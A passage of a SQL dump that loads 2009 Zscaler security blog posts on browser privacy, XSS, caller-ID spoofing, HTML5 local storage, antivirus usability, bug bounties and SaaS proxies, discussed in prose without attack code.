Microsoft relies on m.webtrends.com, and that site sets a unique cookie for you--so Webtrends has the ability to track you no matter where you go. Ditto for Apple, Omniture, and Doubleclick. The fact that these metric and advertising elements are hosted on browser start pages means the services have the opportunity to plant their unique cookie right at the beginning of your surfing session. Plus, look at where and how the start pages are hosted. Microsoft redirects from Microsoft.com to MSN.com, where the start page actually lives. By placing the start page on MSN, all of the MSN cookies are now available--and if you are logged in, that means Microsoft knows who you are and can individually identify you if they so choose. Since Mozilla redirects to Google, the same case generally applies to Google using its own cookies to identify/track you.But fortunately this is only a minor information exposure; knowing you started your web browser is not exactly an earth-shattering privacy violation, and it only occurs at the very beginning of your surfing session (not when you open a new tab, etc.). Plus, this immediate information doesn’t expose where you actually wind up surfing to...just that you opened a browser. The previously mentioned OCSP issue reveals far more information regarding where you are surfing; but it is not the only feature that does so...Many browsers have recently added various anti-phishing and safe surfing features which essentially query the host/URL you are accessing in a database to see if it\'s a known offender and thus should be blocked. Think about that for a second: for every URL/host you visit while surfing the Internet, a lookup is done to ensure the URL is safe. So how is that lookup being done?Some of the browser vendors have designed their features so that databases of the known offenders are downloaded and stored on the user\'s local system, so they can be queried locally. This is ideal, as it means the lookups are fast (just look inside the downloaded file) and it doesn\'t expose the lookups that are actually occurring. However, note that I began this paragraph with the term \"SOME of the browser vendors\"...It turns out the biggest questionable privacy offender is Opera. Their SiteCheck function, enabled by default and meant to warn you when you try to access a malware site, sends a real-time request to sitecheck2.opera.com for every new host you surf to. The transaction looks something like:GET /?host=www.google.com&hdn=naLWSHPy7ud1pACYor32hg== HTTP/1.1User-Agent: Opera/9.64 (Windows NT 5.2; U; en) Presto/2.1.1Host: sitecheck2.opera.com...HTTP/1.1 200 OKDate: Fri, 15 May 2009 15:17:11 GMTContent-Type: text/xml...<?xml version=\"1.0\" encoding=\"utf-8\"?><operatrust version=\"1.1\"><action type=\"searchresponse\"><host></host><ce>14400</ce><w>1</w></action></operatrust>That means Opera hears about every web site host you access, and can keep a historical record if they really wanted to. Now, the SiteCheck queries are not utilizing cookies to track individual users, so tracking granularity is limited to per-source-IP resolution. But it\'s still a notable privacy exposure. Other browser features like IE8\'s Suggested Sites likely expose the same level of information, but I have not confirmed it personally (but their level of privacy warnings and opt-in requirements seem to suggest so).So now that we\'ve gone through all of that, what can you do about it? Well, the good news is that you can generally turn off all of the above mentioned behaviors (you\'ll have to dig around in the Advanced Configuration areas of your browser)...but you might not want to. Sure, you can change your browser start page to something else without ramifications (actually, if you change it to a blank page, you\'ll find your browser starts faster because it doesn\'t have to initially load an external page). But OCSP checking and SiteCheck features are security protections that actually help keep you safe--so by turning that stuff off, you are opening yourself to more risk. So you need to decide what’s more important to you: your security, or your privacy.Happy deciding,- Jeff', 'Data Breach', 'https://www.zscaler.com/blogs/research/those-who-know-where-and-when-you-surf');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (577, 'Cookie Based Persistent XSS', 'Michael Sutton', 'May 08, 2009', 'This is something that I\'ve been meaning to post for a while now as it was included in my Black Hat DC 2009 presentation entitled \'A Wolf in Sheep\'s Clothing: The Dangers of Persistent Web Browser Storage\'. I\'ve noticed an increasing number of sites whereby cross-site scripting vulnerabilities exist not in echoed (reflected XSS) or database stored (persistent XSS) user supplied content, but rather within the cookie itself. This is certainly a form of persistent XSS, but not in the traditional sense as the injected script is stored on the client machine as opposed to the server and only ever exposed to a single victim.         I typically notice this on sites which display a search history. When using search functionality on a site, your past search queries are displayed and rather than storing this content on the server, perhaps in a relational database, it is instead being embedded within a cookie. Let\'s take a look at the search functionality at Sony.com.             In the image to the left, you will note that my past search queries (\'Michael\' and \'Sutton\') are displayed on the right hand side beneath the \'Your Recent Searches\' heading. Now this data has obviously come from past requests and could naturally be stored in a variety of places such as a relational database connected to the web application, within hidden form fields, embedded in the URI, etc. In this particular case however you will see that past searches are actually stored within a cookie, in this case the sonysearch_recent_searches cookie. Now there\'s certainly nothing wrong with that, after all we\'re dealing with a relatively small amount of non-critical data which doesn\'t really need to be stored beyond the current session. However, as you will also note in a later image, the user supplied content accepted in search queries isn\'t appropriately filtered and thus the site is vulnerable to a rather unique form of persistent XSS. Note: This was reported to Sony in February.         So why is this interesting? It\'s just another XSS vulnerability - not exactly an elite club to get into. I find it interesting because it has some unique characteristics. In some ways, it\'s almost a hybrid of reflected and persistent XSS. Let\'s take a look at what I mean by that.         Storage - This is certainly an example of persistent XSS, as the script is stored. However, it is stored on the client side, within a cookie, not within a relational database on the server side as is typically the case.         Victim - Unlike most persistent XSS vulnerabilities, injected script will not affect anyone that visits a vulnerable page. It will only affect a single user (like reflected XSS) as it is transmitted within a cookie when an individual request is made.         As you can see, while we have persistent XSS, it smells like reflected XSS. This could come in handy, if for example an attacker were looking to target a single individual (reflected) but wanted the attack to repeat (persistent) every time the user accessed a certain resource. Consider for example a situation where the attacker wanted to harvest sensitive data every time the victim viewed it. This situation alleviates the timing challenges associated with a successful reflected XSS attack while remaining more stealthy than typical persistent XSS.         Food for thought.         - michael', 'Abuse', 'https://www.zscaler.com/blogs/research/cookie-based-persistent-xss');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (578, 'We Used To Laugh At XSS', 'Michael Sutton', 'April 17, 2009', 'I remember at Defcon 10 in 2002, when members of GOBBLES took to the stage for their much anticipated talk about the state of the security industry. The talk turned out to be a largely incoherent, but entertaining rant and I still remember the Unix Terrorist (aka Stephen Watt) poking fun at the many cross-site scripting (XSS) holes that people had begun to publish advisories for. At the time, he was right. XSS wasn\'t a high risk vulnerability. It wasn\'t being leveraged by attackers for anything meaningful and could be easily thwarted by simply avoiding the use of JavaScript. Well...things have changed. Today, Watt faces some serious charges due to his alleged involvement in the TJX breach and XSS vulnerabilities have emerged as a legitimate threat.         What changed?         Last weekend, a web based Twitter worm (aka Mikeyy/StalkDaily worm) hit the media. It was the work of Michael Mooney, a 17 year old, self described \'bored developer\', who was brazen enough to brag about the attacks after the fact. He may be regretting the publicity at this point, now that his systems have been publicly hacked and he\'s no doubt heard about how Samy Kamkar was rewarded for his efforts after a similar attack on MySpace with a felony conviction. However, thus far it seems to have landed him a job as opposed to jail time.         What has happened to turn XSS from amusing interweb trickery into a valuable attack vector? In short, the web has changed, but unfortunately security is lagging behind. In general, I see the following four factors that deserve credit:         1.) Prevention [should be] the best Medicine - We\'ve known about the dangers of XSS for at least a decade now, and yet it remains the most prevalent web application vulnerability out there. Efforts to educate developers has produced limited results, not in my opinion because developers don\'t care, but because the population of web developers is growing at a tremendous pace, thanks to point \'n click development environments. We\'ve empowered millions with the tools to develop web applications but we\'ve also made it far to easy to produce an insecure application.         2.) The Ubiquity of JavaScript - We used to tell users to avoid XSS by avoiding JavaScript. That was a reasonable statement in 2001 but good luck surfing the web today without a JavaScript enabled browser. You\'d be better off using a text based browser such as lynx. With the advent of AJAX enabled sites and the demand for increasingly interactive, user-friendly web content, you\'d be hard pressed to find a JavaScript free site that is actually used by anyone.         3.) The Power of Social Networking - Web based worms such as the Twitter worm have one inherent limitation - they live within the ecosystem where they were created. While this would be significant for a seldom used web application, with social networking sites measuring active users in the hundreds of millions this is hardly a limitation at all.         4.) Sky\'s the limit - While we tend to think of XSS as a way to steal session credentials, such attacks are limited only be the creativity of the researchers/attackers that pursue them. Anton Rager developed XSS-Proxy as a means to remotely control XSS attacks. Billy Hoffman turned a browser into a vulnerability scanner via XSS. Jeremiah Grossman demonstrated gaining insight into someone\'s browser history and at Black Hat DC this year, I talked about how XSS can be used to conduct client-side SQL injection. The list goes on and on...         The Twitter and MySpace worms were largely benign. When traditional worms began spreading, they were largely benign as well, a proof of concept to prove that something could be done. Once that hurdle had been overcome, criminals moved in to profit and I don\'t expect the outcome to be any different this time around either.         We\'ve set the bar far too low for attackers. Well known vulnerabilities such as XSS remain far too prevalent, despite having been around for years. It\'s encouraging to see Microsoft stepping into the fray by adding XSS prevention to Internet Explorer 8 and I hope that other browser vendors will do the same. While the root cause lies with web app developers, it is clear that focusing on developers alone will not fix the problem. The interconnected nature of the web requires that all players pitch in to reduce risk to end users.         - michael', 'Abuse', 'https://www.zscaler.com/blogs/research/we-used-laugh-xss');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (579, 'Public Service Announcement: EFF Coder\'s Rights Project', 'ThreatLabz', 'April 17, 2009', 'I ran across this today, and thought it was just too valuable to not make mention of. The EFF has a \"Coder\'s Rights Project\" that includes FAQs and guides related to the legalities of security disclosure, reverse engineering, and ethical hacking/testing for security vulnerabilities. They are absolutely fantastic layman summations of all the legal nuances (US-centric) that you should be aware of while pursuing any of these legally grey endeavors. The FAQs and guides concisely lay out how the various US laws, such as DMCA, copyright, and Computer Fraud and Abuse Act can come into play during security testing, disclosure and reverse engineering efforts. The EFF material also provides very good advice regarding how to reduce/limit your risk.If you had any doubt, it should be thoroughly dispelled by the time you are finished reading the material on EFF: testing software and web sites for vulnerabilities is NOT a legally granted right. The law does NOT recognize the concept of \"ethical\" hacking. As such, the true key to ethical hacking is the confidence that the person you are hacking is not going to legally pursue you after your activities. Hack only when you have permission to do so. Without permission, you are putting yourself legally on the hook regardless of your morals and non-malicious intentions.If you are still steadfast in your desire to perform security tests without explicit permission in a manner that you feel is morally clean, then you need to ensure that you keep all your actions above board and follow through on your non-malicious intentions. If you do find a problem, report it immediately. Taking the time, for example, to dump the entire user database along with passwords and play around with it for a few weeks before you finally disclose the problem is not going to be seen as aligned with clean intentions. Also keep in mind that law enforcement agencies are very keen on people trying to hide their identities while undergoing these types of activities; using anonymizers and the like is not looked upon favorably and as such could push your activities to the \'blackhat\' end of the spectrum rather than the \'whitehat.\' If your intentions are good and you have nothing to hide, then don\'t hide it.Above all else, if there is any doubt, then just don\'t do it.Until next time,- Jeff', 'Analysis', 'https://www.zscaler.com/blogs/research/public-service-announcement-eff-coders-rights-project');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (580, 'Spoofing Caller-ID: The New Hacking Inroad', 'ThreatLabz', 'April 13, 2009', 'It is amazing to see the number of bridged services that rely upon the source telephone address of an incoming call (supplied via caller-ID) or SMS message as a form of authentication. Maybe this made sense in the 90\'s when spoofing caller-ID was hard, and the most it would offer is accessing someone\'s voicemail without a PIN. But nowadays there are countless online services that allow SMS and caller-ID source spoofing (Spoofcard, Phonytext, etc). Pair this with the growing number of services offering telephony or SMS integration, and you start to have a problem.\r\n\r\nLet\'s review some recent examples of this situation in action. Twitter was found to allow spoofed SMS messages to perform Twitter account actions/changes. The core problem was first identified nearly two years ago, but a recent variant allowed attackers to circumvent previously added safeguards. Twitter offers the option of using a PIN, but using a PIN impacts the ease of use and the overall user experience--so users do not jump at the opportunity to opt-in to this additional hurdle.\r\n\r\nGoogle Voice has also had a fair amount of problems exposed, although some of the problems use different vulnerability vectors than the simple spoofed caller-ID/SMS. Spoofing caller-ID of a mobile phone configured for a Google Voice account allows an attacker to get into the Google Voice IVR system for that account and modify certain settings. Google has since closed these holes.\r\n\r\nWhile we are talking about hacking telephone/SMS-related services, it is probably worth mentioning an XSS bug found on Skype\'s website. The attacker can try the usual bag of tricks to get a user to click on an XSS-ified link and gain access to the Skype session cookie. Fortunately, it seems Skype session cookies expire after thirty minutes...making the window of exploit opportunity it bit more difficult for an attacker to hit.\r\n\r\nOverall, it is important for companies looking to add SMS/telephony bridged capabilities to their existing services to understand that caller-ID and SMS source information is not reliable for authentication purposes. Period. It is no different than asking a user for their username without the additional authentication aspect of a password; it creates an \"on your honor\" system which is ripe for abuse.\r\n\r\nUntil next time,\r\n- Jeff', 'Abuse', 'https://www.zscaler.com/blogs/research/spoofing-caller-id-new-hacking-inroad');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (581, 'Gmail And HTML 5', 'Michael Sutton', 'April 07, 2009', 'If you accessed Gmail today on your iPhone or Android based phone using a web browser, you will have noticed some differences. It has a few more bells and whistles but of particular interest is the addition of offline access. Gmail went offline a few months ago thanks to Gears (formerly Google Gears). Mobile Safari on the iPhone doesn\'t however have a Gears plugin, so how was this accomplished? The answer lies in the yet to be finalized HTML 5 specification and specifically the client-side database storage functionality that it calls for. While HTML 5 remains a work in progress, WebKit based browsers, such as Safari and Mobile Safari have already adopted database storage. This permits developers to create and subsequently read from/write to a fully capable, locally stored, relational database which is accessed via the web browser. I view today\'s Gmail release as a watershed moment for offline web applications as this is the first mainstream web application that I\'ve seen using the technology.    I view offline access as an inevitable next step for web applications. We have continued to blur the line between desktop applications and their web based counterparts. Technologies such as AJAX, Flash, Silverlight, etc. have continued to push the limits on what browser based applications are capable of but despite all of the added functionality, web apps suffer from one inherent limitation - they disappear when you go off the grid. Well, that\'s about to change.    Local Gmail Storage    Since the iPhone (un-jailbroken) doesn\'t permit raw file access, I\'ll walk through Gmail\'s use of HTML 5 via Safari on a standard OS X platform. First off, in order to get Google to deliver the HTML 5 version of Gmail, we\'ll change the User-Agent header to match that used by the iPhone as follows:    Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20    Now when we visit Gmail, the iPhone version of the app is displayed. At this point, local database storage has automagically been setup. One concern that I have here is that the end user is not informed of this. Gears will at least require the end user to acknowledge that a local copy of data is being set up. While I\'m not a fan of leaving security decisions in the hands of the average end user, I do feel that users should be informed that they\'re now carrying around a local copy of their email, which could be accessible if their phone were ever lost.    Now let\'s see exactly what has been stored locally. On OS X, the database is set up in the following location:    /Users/[username]/Library/Safari/Databases/http_mail.google.com_0/000000000000000x.db    Separate databases will be established for each separate Gmail account accessed, with each receiving an incremented numerical value. The database leverages the SQLite format. As such, database content can be viewed with an application such as the SQLite Database Browser. Below are details the tables that are created, along with a description of the data contained within:           	action_queue - Purpose unclear  	cached_contacts - Top 20 contacts, including email addresses and names  	cached_conversation_headers - Abbreviated content from email messages including the full subject, sender\'s name and first sentence or two of the message  	cached_labels - User defined labels which can be assigned to email messages  	cached_messages - Similar to cached_conversation_headers  	cached_queries - Purpose unclear  	config_table - Application version number  	hit_to_data - Purpose unclear  	log_store - Purpose unclear      Security Concerns    I\'ve commented in the past that Gears and HTML 5 represent fantastic technologies but as with most new technologies, when poorly implemented, they can lead to increased security risk. Applications communicate with local data storage via JavaScript calls. The calls are restricted by a same origin policy to ensure that only the application which created the data, can then subsequently access it. However, as I demonstrated at Black Hat DC this year, when sites are affected by XSS vulnerabilities, a remote attacker could gain access to local database storage and perform client-side SQL injection attacks. Now fortunately, I have no reason to believe that Gmail is currently suffering from any XSS vulnerabilities, but they certainly have numerous times in the past. What I\'m more concerned about is the fact that XSS remains an all too common vulnerability and as other developers adopt local database storage either via Gears or HTML 5, we are sure to see plenty of vulnerable sites, which will place end users at risk. This isn\'t just a privacy concern, it\'s also a data integrity issue as an attacker can write to the database just as easily as they can read from it.    Overall, I feel that the HTML 5 specification has a great deal to offer and it\'s encouraging to see some early adoption. It will be up to developers to ensure that powerful features such as local database storage do not unnecessarily expose end users to increased risk.    - michael', 'Apple', 'https://www.zscaler.com/blogs/research/gmail-and-html-5');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (582, 'Antivirus: Can\'t Live With It, Can\'t Live Without It', 'ThreatLabz', 'March 30, 2009', 'Like you and many other responsible Internet users, I run antivirus software on my desktop. Even leaving the performance issues out of it, I find it very frustrating to configure and use. I get that it\'s complicated behind the scenes, but how many knobs do you really need to say that you\'d like your computer protected from lurking evil? As a security geek, I\'d like a few more knobs than most people, and a little more explanation, but somehow what I want isn\'t available and what I don\'t want is slathered all over my screen in popups and screen after screen of nigh-useless configuration options. Here\'s my take on what antivirus software does:         	Detect viruses (and spyware or whatever else)  	Respond to viruses  	Update detection functionality        That\'s it. Anything else is just variations on a theme, or possibly a smoke screen of some sort.    Detect viruses    Though you wouldn\'t know it to look at any AV I\'ve tried, this should be simple to configure. There are only 3 questions:           	When to look? E.g. continuously [starting in 10 minutes], once right now, regularly in the future  	Where to look? E.g. in memory, on disk, in traffic coming from outside (email, removable media, downloads)  	What to look for? E.g. viruses, spyware, tracking cookies, root kits        For some reason AV vendors seem to scatter these questions over multiple screens with no rhyme or reason (at least from the user\'s point of view) . In the AV I\'m running on one of my machines, where to look is configured differently depending on when to look, so if you scan continuously, you can white-list a directory, but if you scan regularly, no white-list applies. Of course it\'s not all organized by when to look; there\'s one section organized purely by where to look, located in parallel to the when to look sections.    Respond to viruses    Sooner or later, your software will find a virus. If you want your users to think, \"wow! good thing I\'m protected\" rather than \"yecch! I must run straight to my blog and post about how awful AV software is\", help your users respond to the situation constructively. Here are their likely questions:    What\'s going on?    Hopefully, your users are reasonably cautious and therefore don\'t see your \"I found a virus\" dialog regularly. Certainly last week was the first time I\'ve seen this dialog in the course of my regular-user computing (I\'ve seen it plenty when it involves my valiant attempts to protect my malware cache). Most such dialogs try to answer this question with a link to more information, which seems like a fine idea to me.    Ladies and gentlemen, such a link had better work. At the moment your user sees this link, he has been startled out of his task to respond to what he is likely to see as an emergency. He is likely to have a negative emotional response to being startled, the delay in his work, the nature of the emergency (a virus? ewww), et cetera. Even if your target user won\'t understand anything technical you might have to say about the virus, this is the moment you need to convince your wary and probably already irritated user that there is something bad going on, but you, the AV vendor, know all about it. In my case, it took me to a generic search page on my vendor\'s web site (don\'t do this), which claimed it didn\'t know of such a virus when I used the exact name shown on the dialog (good grief, people). When I tried again with a substring of the name given in the dialog,  it found an entry with the exact same title it claimed it couldn\'t find only seconds previously (don\'t do this). This essentially blank entry contained no information whatsoever about when the virus was discovered, its typical effects, how it spreads, related viruses, how to get rid of an infection, or anything else I (or a normal user) might want to know. In short, information in this entry was thin enough that even non-security folks would be wondering whether this was real. Which brings us to the next question.    Are you sure?    It\'s possible that if your users are not security geeks, and you handled the previous question well enough, you wouldn\'t need to face this question. Perhaps some kind of certainty meter would be enough in some cases (but keep it hooked up to something real, please).    My first instinct was to hand a copy of this supposed virus off to our in-house equivalent of Virus Total for a second (and following) opinion. Unfortunately, the AV was now making the files in question very difficult to access (it\'s supposed to, after all), and after an hour or so, I decided it didn\'t matter if it were a false positive, because there was no way I was going to be able to use or copy the files anyway, unless I switched AV (which was tempting at that point). As an AV vendor, if you are confident in your diagnosis, I suggest you provide a button to consult Virus Total or similar. I\'d certainly trust you more, and your less-informed users probably would too.    What can I do about it?    Users are hoping for options like \"remove\", \"repair damage\" or possibly \"quarantine\". If you present options that will not work (e.g. for consistency so the same options always show up), grey them out and provide some kind of indicator why they won\'t work, hopefully including a way to make it work. In my case, both remove and the equivalent of \"remove as superuser\" landed me in an endless loop of dialog boxes involving UAC and the AV software (but not, interestingly, ever actually attempting to become Administrator as one would expect). The equivalent of \"quarantine\" also failed. In the end, I had to empty the quarantine area of an old copy of my previously quarantined-against-my-will malware stash, from before I moved it to a machine with a decent OS, quarantine, and then empty quarantine again. This solution required a fair amount of hunting around and more information about how AV usually works than was readily apparent from the dialogs. I don\'t think most AV users would be able to do it, e.g. an acquaintance whose AV (a different brand) kept alerting about viruses but wouldn\'t let her get rid of them, who ended up having to send her machine in for service last month.    Another option I\'d like to see is \"submit for re-analysis\" or similar. Users could do this if they think it is a false positive. With an automated service to see the results from files that have already been re-analyzed, this could add an option like \"ignore\" to the available options (better put the file on a white list so you don\'t bother the user again, though).    Update detection functionality    Trust me, the user does not want to hear about this in real-time. By all means, log plenty and request assistance from the user if something you can\'t fix automatically goes wrong with your attempt. I used to use some AV that assured me it was updating successfully even though my network was quiescent and the only file changed on disk was the log file -- quiet failure of protective equipment is never desirable. But as soon as it\'s going right again, shut up and go away! Do not make your innocent user click through dialog after dialog if she happens to disconnect from the net for a week.    When to look, and maybe where to look if there are choices, is the only thing you need to configure. Snag information about proxy settings and the like from the OS; don\'t make us configure them again.    Yes, there are some other aspects of operation some of us might want to control. But chances are good that from the user\'s perspective, most of them are about one of the above functions, so do your users a favor and make them accessible from the same place as the related settings. Your users\' lives would be better if they could configure your software to do what they want, and organizing settings in a way that makes sense to the user is a good starting point.    --Brenda', 'AntiVirus', 'https://www.zscaler.com/blogs/research/antivirus-cant-live-it-cant-live-without-it');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (583, 'Changing A Tire While Going 60mph', 'ThreatLabz', 'March 26, 2009', 'In my previous post Big, white, puffy clouds can still evaporate, I mentioned the Google Gmail outage from February and pointed out the implied resiliency (or lack there-of) of cloud-based platforms. Rich Miller over at DataCenterKnowledge.com just posted an interview with Urs Holzle from Google entitled \"How Google Routes Around Outages.\" The title of this post is a quote from the referenced article, and it seems rather fitting.On the one hand, I was a bit surprised to read Holzle admit the preference to have human involvement in remediating certain types of outages. It seems Google has automated technological controls to handle single system and small-scale failures (a whole equipment rack, etc.) within a single data center; but larger scale outages (such as a whole data center) are mitigated manually. On the other hand, I can understand the desire to have explicit human oversight; large-scale failures tend to have unpredictable cascading effects that are hard to account for with automated systems. In fact, Holzle mentions that the very systems designed to handle larger-scale outages tend to be the same systems responsible for the outages; the February GMail outage is an explicit example.Having said that, I still believe clouds need to be as self-sustaining as possible (preferably in automated fashion) despite the current limits of technology and engineering. That implied resiliency and redundancy is one of the core value propositions of clouds. Without it, clouds get devalued into not much more than a traditional managed hosting platform/service.My suggestion to organizations considering a purchase from a cloud-based vendor is to have a due-diligence discovery session regarding the cloud architecture that vendor has engineered. You want to see something akin to a fairly detailed Visio diagram depicting multiple datacenter/regional locations, with appropriate systems in each location and the roles they provide to the overall cloud platform and offered services. You want to see redundancy in systems and roles, with distribution and backups across disparate regions. Look for points of failure, and ask them how the entire cloud handles an outage and thwarts a service interruption during the failure for any given node you happen to point to. Especially point to an entire datacenter/region and ask what happens if that entire area of the cloud system goes down due large-scale power outage, natural disaster, etc. Also be wary of how cloud entrance points could become affected during an outage; it is great if the overall service will naturally shift processing to a secondary region if the entire first region experiences an outage, but it is also not so great if you have to explicitly go back and reconfigure your organization to point to the secondary region. Even though the processing survived, your point of entrance changed and thus you still had an outage. You definitely want to ensure all points of presence/entrance are fault tolerant.Overall, going with a cloud vendor still requires you to think about redundancy, fault tolerance, business continuity, etc. And it might require a little extra effort up front in order to ferret out the appropriate details from your cloud vendor during the initial evaluation. Fortunately, once you are satisfied with the resiliency offered by the vendor\'s cloud architecture, you can then focus your attention elsewhere--the vendor is the one that has to deal with the implementation and ongoing maintenance of the necessary architecture redundancy. And that is one headache that is definitely nice to outsource.Until next time,- Jeff', 'Cloud', 'https://www.zscaler.com/blogs/research/changing-tire-while-going-60mph');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (584, 'Hugs Not Bugs', 'Michael Sutton', 'March 25, 2009', 'At CanSecWest last week, a group of researchers (Charlie Miller, Alex Sotirov and Dino Dai Zovi) stirred up a fair bit of controversy by pushing a \"No More Free Bugs\" campaign. The premise of which was that they are unwilling to put in the time and effort to research software vulnerabilities and then simply hand them over to software vendors free of charge. This concerned those in the \'Hugs Not Bugs\' camp who feel that researchers have a moral obligation to turn over vulnerability details to software vendors free of charge, as such an approach is in the best interest of all involved.         Full Disclosure         Before diving into my personal views on the subject of paid vulnerability research let me first provide full disclosure (blogger style). I know and respect the researchers that stood up an CanSecWest. Charlie Miller in particular served as a technical reviewer for the Fuzzing book that I co-wrote along with Pedram Amini and Adam Greene. Charlie is a great researcher and a stand-up guy.         My stance on paying for vulnerability research certainly isn\'t much of a secret. I ran the iDefense/Versign Vulnerability Contributor Program (VCP) for several years. We secured the intellectual property rights to hundreds of vulnerabilities during my tenure and worked with affected vendors to ensure that patches were ultimately produced for all issues. Our motivation was certainly financial and was driven by acquiring early access to vulnerability information and providing workarounds to clients until official patches became available. TippingPoint/3com went on to launch a similar program with their Zero Day Initiative (ZDI), which was actually launched by former iDefense employee, David Endler who was instrumental in launching the VCP program as well.         During my time at iDefense I came to realize the value of vulnerabilities. I also came to understand just how much software vendors benefited from such information. Bugs are not good for vendors as they result in negative publicity and reduce consumer confidence in a given product or vendor. Therefore, vendors have a very real incentive to ensure that they receive vulnerability information as quickly as possible and that such information does not become public knowledge. For a long time, vendors have promoted the hugs not bugs philosophy. Why wouldn\'t they? When researchers freely hand over vulnerability details, vendors receive monetary value at no cost and therein lies the failure. In a free market economy, value is not given away for very long before a market evolves. This led to the creation of programs such as the VCP and ZDI. Vendors have also heavily benefited from these programs as they still receive vulnerability details free of charge. The fee to the researcher is paid by a middle man.         Current State         It still amazes me that the VCP and ZDI remain the only open, main stream programs paying for vulnerabilities. Believe me, there is plenty of room at the party for others. Bugs are not going away. That does not however mean that there aren\'t other entities willing to pay for vulnerabilities. Unfortunately, other entities have no interest in sharing vulnerability information with software vendors. Government entities and criminal organizations are very willing to pay for vulnerabilities. However, they have very different motivations and seek to use the information for offensive purposes meaning that they have little interest in seeing patches emerge.         Despite understanding the value of vulnerabilities, vendors have been unwilling (at least openly) to pay for such information. The argument given is typically that they fear they will be held hostage by researchers demanding increasingly outrageous sums of money and threatening to publicly disclose the bug if they aren\'t paid. This argument just doesn\'t fly. Bug hunters already have numerous avenues to profit form their research should they choose to. If they seek the highest bidder they will find one and vendors will never be in the bidding process to begin with.         My Solution         My stance is simple. It\'s time for vendors to start paying for the value that they receive. Mozilla has for years had a program known as the Mozilla Security Bug Bounty Program. The program is quite basic - contributors receive $500 (and a t-shirt!) for critical security bugs which meet specific criteria. Now $500 pales in comparison to the $50K+ that may be available for the juiciest bugs but in my opinion the total value isn\'t the point. Those motivated solely by cash will go elsewhere, but I believe that the majority of researchers have little interest in negotiating back room deals to get full value. Rather, they are motivated by doing good, but want to be compensated to at least some degree for their hard work.         What\'s the appropriate price point for vendors? I\'ll leave that to the free market to decide. After all, that\'s what the invisible hand is for. Let\'s however consider the $5K value that was used by the Pwn2Own contest. By my count, during 2008, Microsoft issued 46 critical advisories. That amounts to $230K in payouts for such information. Now let\'s double that number to convert from advisories to actual vulnerabilities. We\'re still at less than $500K, which amounts to less than the salary of a three to four experienced bug hunters on staff and even if Microsoft hired a hundred bug hunters they\'d fail to identify all of the bugs found by outside researchers. It\'s also 2x the value that Microsoft is willing to pay as a bounty to catch those behind the Conficker worm. A worm that wouldn\'t have seen the light of day if critical Microsoft vulnerabilities had not existed in the first place.         Let\'s be honest, vendors have been paying for vulnerability knowledge for some time through employee salaries, lavish parties, recruiting efforts, etc., so why has it always been considered taboo to pay for the information directly? It time for a leading vendor (I\'m talking to you Microsoft) to step up and establish a program to pay third party researchers for the work that they do. Establish fixed prices (non-negotiable) for vulnerabilities that fit into your already well established severity rating system. Don\'t worry about paying more than everyone else but pay enough to compensate researchers for their time. I suspect that you\'ll be pleasantly surprised by the results.         Hugs Not Bugs was dead a long time ago...Charlie, Dino and Alex just made it official.         - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/hugs-not-bugs');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (585, 'New Browser Security Model Needed For SaaS?', 'ThreatLabz', 'March 23, 2009', 'As the age of Software as a Service (SaaS) becomes realized, we are finding that this new way of doing business can sometimes be at odds with previous methodologies and processes. Note that this is not particularly insightful as stated since it is derivative of the fundamental definition of disruptive innovation. But the trick with SaaS is that, on the surface, we have the notion of enacting the same standard processes we enact on any other given day (i.e. running software); the only perceived difference is that the software is running external to the enterprise instead of internal to it. Most people do not see that as a significantly different context—running software is running software, whether inside or outside the organizational boundaries.What people often fail to immediately see is that there is more at play here. Namely, history has given us operational models that are sensitive to the location of where the software is running. The web browser, exemplified by Internet Explorer, is a great example. IE\'s security model segregates different destinations into appropriate security zones. Each security zone is configured to a different risk profile. The traditional zones include explicitly trusted destinations, intranet destinations, and the rest of the Internet. Under this model, the Internet security zone is risk-averse while the intranet and trusted security zones are more lax.SaaS challenges this established model of security zones since it involves taking software functionality typically operating internal to the organization (in the intranet security zone) and moving it external to the organization (in the Internet security zone). The same software functionality is now acting under an entirely different risk profile since it is located in a different zone, and that can impact the functionality and/or the user experience.Let us look at a particular situation applicable to the Zscaler offering. Organizations traditionally host their HTTP proxies within their organizational boundaries. Those proxies operate in the intranet security zone; within this zone, the browser (IE) is willing to automatically authenticate to the proxies using native Windows authentication. The result is that the authentication process is transparent to the user, and everything just works. Now consider what happens when those proxies are moved outside the organization as part of a SaaS: the proxies fall into the Internet zone—and the browser does not natively perform transparent authentication in that zone. In fact, it requires significant browser re-configuration (and arguably some non-ideal loosening of security restrictions) before the browser will once again exhibit this behavior outside the intranet zone. Administrators have grown complacent with automatic HTTP proxy authentication within the organization; we would even venture to call the feature ubiquitous. So imagine the administrators\' surprise when this seemingly fundamental HTTP proxy behavior is upset when shifting to a SaaS-provided HTTP proxy. Absolutely nothing about the technology has changed—the only difference is the browser-enforced security model relating to where the resource is located.So what needs to happen? Vendors need to review and refresh their security models to ensure they are compatible with the SaaS paradigm of transferring once-internal resources out onto the Internet and into the cloud. Fortunately most SaaS services acting as a normal HTTP web site destination can be accommodated by explicit inclusion on the trusted destinations list; SaaS-provided HTTP proxy services are at a much larger loss because that mechanism does not directly apply to proxies. In fact, the proxy configurability and support offered by most web browsers often suffers from legacy networking assumptions and feature atrophy. Internet Explorer in particular introduced the (now) standard crop of proxy capabilities in IE 5 (WPAD and PAC support, circa 1999); we are now one decade later and there have been no additions to IE\'s proxy configurability or feature support since then. Other browsers have normalized to the same feature set as well, offering no new innovation in that area. I believe that the last ten years have brought about many process changes that warrant revisiting the role that HTTP proxies play in the enterprise, how the web browser should relate to those roles, and how SaaS can 